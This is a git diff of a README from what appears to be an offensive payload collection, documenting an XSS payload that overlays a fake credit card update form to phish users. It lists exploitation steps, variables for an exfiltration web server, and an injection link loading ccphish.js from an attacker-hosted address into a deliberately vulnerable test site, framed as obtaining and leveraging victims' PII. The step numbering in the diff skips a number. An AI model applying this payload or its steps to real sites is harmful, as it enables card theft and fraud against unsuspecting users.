@@ -1,4 +1,4 @@
-# [unauthn] Credit Card Update Prompt (Phish)
+# [unauthn] Credit Card Update Form (Phish)
 
 <p align="justify">This payload adds HTML code as an overlay to the target web page (containing the XSS vulnerability). The code displays a Credit Card Update popup form. If blended in the application's context sufficiently, once they encounter such a prompt, most users have a (proven) tendency to blindly provide it requested information (which contributes to a higher success rate of such phishing attacks).<p>
 
@@ -50,7 +50,12 @@ http://testphp.vulnweb.com/listproducts.php?cat=XSS_PAYLOAD_HERE
 
 ## Exploitation Steps
 
-1. [setup exploit] change payload variable values (`ccphish.js`; `redir.php`)
+1. [setup exploit] adapt to target environment
+
+    * change logo (image + displayed dimensions)
+    * modify CSS (scenario-dependent)
+
+3. [setup exploit] change payload variable values (`ccphish.js`; `redir.php`)
 
     `attWsPhishPath` - exfiltration web server URL (i.e. scheme + FQDN + port + path; use trailing slash)
 
@@ -60,9 +65,9 @@ http://testphp.vulnweb.com/listproducts.php?cat=XSS_PAYLOAD_HERE
 
     `url` - exfiltration web server URL
 
-2. [setup exploit] setup web server (to serve the payload/redirector)
+4. [setup exploit] setup web server (to serve the payload/redirector)
 
-3. [social engineering attack] victim user clicks link
+5. [social engineering attack] victim user clicks link
 
     ```
     http://testphp.vulnweb.com/listproducts.php?cat=<script src=http://192.168.5.5/ccphish.js></script>
@@ -72,15 +77,15 @@ http://testphp.vulnweb.com/listproducts.php?cat=XSS_PAYLOAD_HERE
       * `testphp.vulnweb.com` - target site
       * `192.168.5.5` - web server hosting the payload
 
-4. [social engineering attack] victim user provides requested information
+6. [social engineering attack] victim user provides requested information
 
     *(attacker obtains PII data)*
 
-5. [post exploit] attacker leverages obtained PII data
+7. [post exploit] attacker leverages obtained PII data
 
 ## Screenshots
 
-* **NOTE**: the screenshot covers steps 1 to 4 from the "Exploitation Steps" chapter
+* **NOTE**: the screenshot covers steps 2 to 5 from the "Exploitation Steps" chapter
 
 <p align="center">
   <kbd>
